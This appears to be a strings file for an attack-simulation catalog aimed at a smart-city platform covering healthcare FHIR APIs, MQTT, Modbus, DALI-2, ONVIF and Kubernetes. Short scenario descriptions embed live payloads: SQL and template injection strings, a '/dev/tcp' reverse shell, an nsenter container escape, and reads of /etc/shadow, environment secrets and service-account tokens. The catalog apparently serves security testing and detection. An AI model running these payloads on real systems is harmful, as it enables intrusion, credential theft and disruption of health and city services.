network.name: Network-Based Attacks
network.description: DDoS, amplification, flooding, and network-layer threats

application.name: Application Layer Attacks
application.description: Injection, smuggling, parameter tampering, and API abuse

authentication.name: Authentication & Session
authentication.description: Brute force, credential stuffing, JWT attacks, privilege escalation

data.name: Data-Focused Attacks
data.description: Exfiltration, tampering, ransomware, and data theft

container.name: Container/Runtime Attacks
container.description: Shell spawns, escape attempts, crypto miners, and runtime abuse

lateral.name: Lateral Movement & Persistence
lateral.description: Service discovery, credential relay, backdoor persistence

iot_protocol.name: IoT Protocol-Specific
iot_protocol.description: MQTT, CoAP, Modbus, OPC UA, DALI-2, ONVIF protocol attacks

campaign.name: Multi-Stage Campaigns
campaign.description: APT-style multi-stage attack chains with kill-chain progression

scenarios.name: SQL Injection (Classic)
scenarios.description: Classic SQL injection on healthcare-api patient search. Payload: 1' OR '1'='1 bypasses authentication to dump all patient records.

scenarios.name: DALI Broadcast Shutdown
scenarios.description: DALI-2 broadcast ALL OFF command (0xFF) sent to street lighting controller. Causes city-wide blackout across all 3 lighting zones simultaneously.

scenarios.name: ONVIF PTZ Hijacking
scenarios.description: ONVIF PTZ (Pan-Tilt-Zoom) control hijack via ContinuousMove command. Attacker locks camera in extreme position, blinding ANPR coverage on monitored intersection.

scenarios.name: MQTT Topic Traversal
scenarios.description: MQTT wildcard subscription to # (all topics) on broker. Attacker subscribes to all IoT traffic across all 5 smart city domains — traffic, parking, health, env, lighting.

scenarios.name: SQL Injection (Time-based)
scenarios.description: Time-based blind SQL injection. Payload: 1'; WAITFOR DELAY '0:0:5'-- causes 5-second delay, confirming injectable parameter.

scenarios.name: SQL Injection (Union)
scenarios.description: UNION-based SQL injection on parking reservation system. Extracts database schema and user credentials via UNION SELECT.

scenarios.name: Command Injection
scenarios.description: OS command injection via traffic camera diagnostic endpoint. Payload: ; cat /etc/passwd exploits unsanitized input in system() call.

scenarios.name: SSTI (Jinja2)
scenarios.description: Server-Side Template Injection via FHIR resource description field. Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} executes arbitrary code.

scenarios.name: XXE Injection
scenarios.description: XML External Entity injection via ONVIF GetDeviceInformation SOAP request. DTD references file:///etc/passwd to exfiltrate system credentials.

scenarios.name: API Parameter Tampering
scenarios.description: API parameter tampering on parking reservation system. Attacker modifies user_id and is_admin fields in JSON body to escalate privileges.

scenarios.name: FHIR Resource Manipulation
scenarios.description: Direct modification of FHIR Observation.valueQuantity for SpO2 readings. Alters critical vital sign data that healthcare providers rely on for treatment decisions.

scenarios.name: Modbus Function Code Abuse
scenarios.description: Unauthorized Modbus write to environmental sensor holding registers 40001-40016. Falsifies PM2.5 and O3 values to hide pollution event from city air quality monitoring.

scenarios.name: Reverse Shell Spawn
scenarios.description: Reverse shell spawned inside traffic camera container. bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 — attacker gains interactive CLI access.

scenarios.name: Cryptominer Deployment
scenarios.rule: Detect crypto miners using the Stratum protocol
scenarios.description: xmrig crypto miner deployed inside IoT device pod. Outbound stratum+tcp connection to mining pool on port 3333, consuming 95% CPU.

scenarios.name: Sensitive File Read (/etc/shadow)
scenarios.description: Reading /etc/shadow in healthcare container to harvest hashed passwords. Process cat triggered by www-data user — attempting offline password cracking.

scenarios.name: Container Escape (Privileged)
scenarios.description: Container escape via nsenter — full host namespace access from privileged container. nsenter --target 1 --mount --uts --ipc --net --pid gives root on K3s worker node.

scenarios.name: K8s API Access
scenarios.rule: Contact K8s API Server From Container
scenarios.description: Contact Kubernetes API server from inside parking-system pod. curl https://kubernetes.default.svc/api with stolen service account token.

scenarios.name: Binary Download & Execute
scenarios.description: Wget/curl downloads malicious binary from attacker C2 server, then executes it. Binary is a reconnaissance tool for mapping the internal Kubernetes network.

scenarios.name: Dynamic Code Execution
scenarios.description: Python exec()/eval() called with attacker-controlled input inside FHIR API. __import__('os').system('id') executed via deserialized FHIR extension field.

scenarios.name: Environment Variable Stealing
scenarios.description: Reading /proc/self/environ and /proc/1/environ to steal API keys and database passwords. Exposes FHIR_DB_PASSWORD, XAI_API_KEY, and other secrets from environment.

scenarios.name: Patient Record Exfiltration
scenarios.description: Bulk exfiltration of FHIR Patient resources including PHI/PII. All patient demographics, conditions, medications exported via /api/patients endpoint.

scenarios.name: License Plate Harvesting
scenarios.description: ANPR database dump from traffic camera system. 24 hours of license plate images, timestamps, and vehicle classifications extracted.

scenarios.name: Environmental Data Tampering
scenarios.description: Tampering with environmental sensor AQI readings via Modbus register writes. PM2.5 values forced to 0 to hide industrial pollution event from city dashboard.

scenarios.name: Ransomware Simulation
scenarios.description: Simulated ransomware encrypts FHIR data directory, ONVIF configs, and DALI scene files. Ransom note demands 5 BTC to restore healthcare and IoT fleet operations.

scenarios.name: Kubernetes Secret Theft
scenarios.description: Kubernetes service account token and secrets exfiltrated from pod filesystem. Attacker reads /var/run/secrets/kubernetes.io/serviceaccount/token for cluster access.

scenarios.name: MQTT Message Replay
scenarios.description: Captured MQTT messages replayed to broker — old commands re-executed against IoT devices. Historical parking availability and lighting schedules replayed to cause chaos.

scenarios.name: Log Tampering
scenarios.mitre_name: Clear Linux or Mac System Logs
scenarios.description: Attacker clears /var/log entries and application logs in healthcare pod. Removes evidence of prior intrusion activities — FHIR access logs wiped.

scenarios.name: FHIR Bundle Injection
scenarios.description: Injection of fabricated FHIR Bundle with false patient records and observations. Creates phantom patients with critical conditions to trigger unnecessary medical responses.

scenarios.name: MQTT Unauthorized Publish
scenarios.description: Unauthorized MQTT PUBLISH to lighting control topic — sends shutdown command to all luminaires. No ACL on broker allows attacker to control all IoT devices via message injection.

scenarios.name: FHIR Resource Deletion
scenarios.description: Bulk DELETE of FHIR Patient and Observation resources. Attacker wipes all patient records and vital sign history from healthcare API.

scenarios.name: MQTT Retained Message Poisoning
scenarios.description: Attacker publishes retained MQTT message with malicious configuration. New IoT devices connecting to broker receive poisoned config as first message.

scenarios.name: MQTT Client ID Spoofing
scenarios.description: Attacker connects to MQTT broker using Client ID of legitimate traffic camera. Steals existing session, disconnecting real device and hijacking its topic subscriptions.

scenarios.name: CoAP Observe Flood
scenarios.description: CoAP Observe registration flood against parking sensors. 10000 Observe requests force sensors to send updates to attacker for every state change.

scenarios.name: Modbus Coil Write Attack
scenarios.description: Unauthorized Modbus write to coil registers on environmental sensor PLC. Disables all 16 air quality monitoring channels simultaneously.

scenarios.name: Modbus Function Code Scan
scenarios.description: Sequential Modbus function code scan (FC 1-127) probing supported operations. Discovers which read/write/diagnostic functions the PLC supports.

scenarios.name: OPC UA Session Hijacking
scenarios.description: OPC UA session token stolen and replayed against environmental sensor OPC UA server. Attacker reads all monitoring namespace variables using hijacked session.

scenarios.name: DALI-2 Dimming Attack
scenarios.description: DALI-2 rapid dimming commands cycling between 0% and 100% at 10Hz. Causes visible flickering across lighting zone-A, wastes energy, and damages LED drivers.

scenarios.name: ONVIF Stream Hijacking
scenarios.description: ONVIF GetStreamUri hijack — attacker reroutes RTSP stream to attacker-controlled proxy. Live surveillance feed exfiltrated while displaying recorded loop to legitimate viewers.

scenarios.name: Internal Network Scan
scenarios.description: nmap-style scan from compromised traffic camera pod. Scans 10.42.0.0/24 for open ports 22, 80, 443, 1883, 5432, 8000, 9090.

scenarios.name: Service Discovery (DNS)
scenarios.description: Kubernetes DNS SRV queries to discover internal services from compromised parking pod. Locates healthcare-api, mqtt-broker, and env-sensor services via DNS.

scenarios.name: Pod-to-Pod Credential Relay
scenarios.description: Stolen service account token from healthcare-api used to access parking-system. Kubernetes RBAC bypass via cross-pod credential relay.

scenarios.name: CronJob Persistence
scenarios.description: kubectl create cronjob backdoor — runs reverse shell every 5 minutes. CronJob spec mounts host filesystem for persistent access.

scenarios.name: Web Shell Upload
scenarios.description: Python web shell uploaded to traffic camera container apache directory. Provides remote command execution via HTTP GET parameter.

scenarios.name: DNS Hijacking for C2
scenarios.description: Modification of /etc/hosts in env-sensor pod to redirect DNS to C2 server. All OPC-UA telemetry uploads redirected to attacker-controlled endpoint.

scenarios.name: TCP SYN Flood
scenarios.rule: ET DOS Possible TCP SYN Flood
scenarios.description: High-rate TCP SYN flood targeting ONVIF camera ports (80/554/8080). Saturates connection table to blind RTSP surveillance feeds.

scenarios.name: TCP RST Injection
scenarios.description: Spoofed TCP RST packets injected into active FHIR sessions. Disrupts medication dosage synchronization between gateway and EHR.

scenarios.name: ARP Spoofing (Simulated)
scenarios.description: ARP cache poisoning redirects parking sensor traffic through attacker node. Enables MQTT message interception between sensors and broker.

scenarios.name: VLAN Hopping
scenarios.description: DTP/802.1Q double-tagging to hop from IoT VLAN to management VLAN. Attempts to reach DALI-2 lighting controller management interface.

scenarios.name: MQTT Subscribe Flood
scenarios.description: Rapid SUBSCRIBE packets to MQTT broker with wildcard topics (#). Forces broker to route all messages to attacker, overloading routing table.

scenarios.name: CoAP Amplification
scenarios.description: CoAP GET .well-known/core amplification against parking sensors. Spoofed requests cause sensors to send large resource directory responses.

scenarios.name: OPC UA Discovery Flood
scenarios.rule: ET SCAN OPC UA Discovery Flood
scenarios.description: OPC UA FindServers/GetEndpoints flood against environmental sensor. Overwhelms OPC UA stack at port 4840 with rapid discovery requests.

scenarios.name: UDP Amplification (NTP)
scenarios.rule: ET DOS Possible NTP DDoS Amplification
scenarios.description: NTP monlist amplification attack (50x amplification factor). Spoofed source IP causes NTP servers to flood target with responses.

scenarios.name: DNS Amplification
scenarios.description: DNS ANY query amplification targeting MQTT broker. Spoofed queries to open resolvers amplify traffic 70x towards broker port 1883.

scenarios.name: SSDP Reflection
scenarios.description: SSDP M-SEARCH reflection attack against environmental sensor OPC UA port. UPnP-enabled devices used as reflectors with 30x amplification.

scenarios.name: Slowloris HTTP
scenarios.description: Slowloris attack keeps HTTP connections open with partial headers. Exhausts healthcare-api connection pool, blocking legitimate FHIR requests.

scenarios.name: Slow POST
scenarios.description: Slow HTTP POST attack sends body data at 1 byte/second. Parking system MQTT/CoAP gateway threads exhausted waiting for complete requests.

scenarios.name: Connection Exhaustion
scenarios.description: Opens thousands of TCP connections to MQTT broker port 1883 without completing CONNECT handshake. Exhausts broker file descriptor limit, blocking legitimate IoT device connections.

scenarios.name: ICMP Flood
scenarios.description: ICMP echo request flood (ping of death variant). Oversized ICMP packets saturate camera pod network interface.

scenarios.name: IP Fragmentation Attack
scenarios.description: Overlapping IP fragment attack causes reassembly buffer overflow. Targets traffic camera RTSP stream with fragmented UDP packets.

scenarios.name: Brute Force Login
scenarios.description: Brute force attack against healthcare-api FHIR authentication endpoint. 500 login attempts in 60 seconds with top-10000 password list.

scenarios.name: Credential Stuffing
scenarios.description: Credential stuffing with leaked database against parking system. Uses 1000 email/password pairs from known breaches.

scenarios.name: JWT None Algorithm
scenarios.description: JWT algorithm confusion attack — sets alg='none' to bypass signature verification. Forges admin JWT to access all patient records without authentication.

scenarios.name: Default Credentials
scenarios.description: Default credential attack against MQTT broker — admin:admin, root:root, guest:guest. Mosquitto broker accepting default passwords in IoT deployment.

scenarios.name: Password Spraying
scenarios.description: Password spraying attack — one password (Password123!) tested against all user accounts. Avoids lockout by limiting to 1 attempt per user.

scenarios.name: Privilege Escalation (Vertical)
scenarios.description: Vertical privilege escalation via is_admin parameter injection. Standard user promotes self to admin role by modifying POST body.

scenarios.name: OAuth Token Theft
scenarios.description: Bearer token extracted from MQTT message payload in transit. Token grants full FHIR R4 API access to patient data across all resources.

scenarios.name: Session Hijacking
scenarios.description: Session cookie stolen via MQTT message interception. Attacker replays session ID to impersonate healthcare provider.

campaigns.name: Healthcare APT
campaigns.description: Advanced Persistent Threat against healthcare infrastructure. 6-stage kill chain from initial SQL injection to full patient data exfiltration.

campaigns.name: Ransomware City
campaigns.description: City-wide ransomware campaign targeting healthcare and IoT fleet. 5 stages from credential theft to full data encryption.

campaigns.name: IoT Botnet Builder
campaigns.description: Botnet recruitment across smart city IoT fleet. 6 stages from network recon to DDoS launch using compromised cameras and sensors.

campaigns.name: Smart Grid Disruption
campaigns.description: Coordinated attack on city power/lighting and environmental monitoring. 5 stages targeting DALI-2 lighting and Modbus environmental sensors.

campaigns.name: Medical Device Hijack
campaigns.description: Targeted attack chain against healthcare IoT devices (IEEE 11073). 5 stages from FHIR exploitation to vital sign manipulation.
